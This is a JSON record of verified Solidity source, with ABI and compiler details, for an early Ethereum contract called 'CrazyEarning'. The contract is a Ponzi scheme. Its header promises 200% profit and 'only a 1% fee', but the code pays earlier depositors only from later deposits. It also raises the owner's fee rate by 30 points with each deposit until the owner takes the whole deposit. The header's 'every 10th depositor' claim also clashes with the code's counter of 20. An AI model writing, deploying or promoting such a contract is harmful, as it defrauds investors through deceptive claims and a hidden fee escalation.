{"SourceCode":"//------------------------------------------------Crazy Earning--------------------------------------------------------------\r\n//\r\n// Prepare yourself for the biggest earning game out there! You will earn 200% profit after each deposit!\r\n// Every 10th depositor will earn 700% profit. This is the craziest investment game, because it can make you rich very fast!\r\n//\r\n// There is only a 1% fee, everything else goes to the investors! \r\n//\r\n// Minimum Deposit: 0.4 Ether (400 Finney)!\r\n//\r\n// Start earning NOW!\r\n//\r\n//---------------------------------------------------------------------------------------------------------------------------\r\ncontract CrazyEarning{\r\nstruct earnerarray{\r\naddress etherAddress;\r\nuint amount;\r\n}\r\nearnerarray[] public crazyearners;\r\nuint public deposits_until_jackpot=0;\r\nuint public totalearners=0; uint public feerate=1;uint public profitrate=200;uint public jackpotrate=700; uint alpha=1; uint feeamount=0; uint public balance=0; uint public totaldeposited=0; uint public totalmoneyearned=0;\r\naddress public owner; modifier onlyowner{if(msg.sender==owner)_}\r\nfunction CrazyEarning(){\r\nowner=msg.sender;\r\n}\r\nfunction(){\r\nenter();\r\n}\r\nfunction enter(){\r\nif(msg.value<400 finney){\r\nreturn;\r\n}\r\nuint amount=msg.value;uint tot_pl=crazyearners.length;totalearners=tot_pl+1;\r\ndeposits_until_jackpot=20-(totalearners%20);\r\ncrazyearners.length+=1;crazyearners[tot_pl].etherAddress=msg.sender;\r\ncrazyearners[tot_pl].amount=amount;\r\nfeeamount=amount*alpha/100;balance+=amount;totaldeposited+=amount;\r\nif(feeamount!=0){if(balance>feeamount){owner.send(feeamount);balance-=feeamount;\r\ntotalmoneyearned+=feeamount;if(alpha<100)alpha+=30;\r\nelse alpha=100;}} uint payout;uint nr=0;\r\n\r\n\r\nwhile(balance>crazyearners[nr].amount*200/100 && nr<tot_pl)\r\n{\r\nif(nr%10==0&&balance>crazyearners[nr].amount*700/100)\r\n{\r\npayout=crazyearners[nr].amount*700/100;\r\ncrazyearners[nr].etherAddress.send(payout);\r\nbalance-=crazyearners[nr].amount*700/100;\r\ntotalmoneyearned+=crazyearners[nr].amount*700/100;\r\n}\r\nelse\r\n{\r\npayout=crazyearners[nr].amount*200/100;\r\ncrazyearners[nr].etherAddress.send(payout);\r\nbalance-=crazyearners[nr].amount*200/100;\r\ntotalmoneyearned+=crazyearners[nr].amount*200/100;\r\n}\r\nnr+=1;\r\n}}}","ABI":"[{\"constant\":true,\"inputs\":[],\"name\":\"feerate\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"jackpotrate\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"deposits_until_jackpot\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalmoneyearned\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalearners\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"profitrate\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"crazyearners\",\"outputs\":[{\"name\":\"etherAddress\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"balance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totaldeposited\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"enter\",\"outputs\":[],\"type\":\"function\"},{\"inputs\":[],\"type\":\"constructor\"}]","ContractName":"CrazyEarning","CompilerVersion":"v0.2.2-2016-03-10-34d714f","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","LicenseType":"","SwarmSource":""}
